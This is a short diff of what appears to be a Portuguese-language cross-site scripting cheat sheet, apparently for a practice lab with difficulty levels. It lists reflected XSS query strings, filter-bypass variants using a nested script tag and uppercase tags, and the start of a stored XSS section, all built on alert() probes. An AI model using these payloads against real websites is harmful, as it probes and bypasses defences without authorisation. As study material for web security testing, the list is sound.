@@ -4,12 +4,14 @@
 ?q=%3Cscript%3Ealert(1)%3C/script%3E
 ?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
 
+MEDIUM
+
 Aninhado
 <scr<script>ipt>alert(1)</script>
 
 Maiúsculas (porque o filtro só apanha minúsculas):
-
 <SCRIPT>alert(1)</SCRIPT>
+
 
 # ───── XSS ARMAZENADO (fica guardado) ─────
 <script>alert(document.domain)</script>
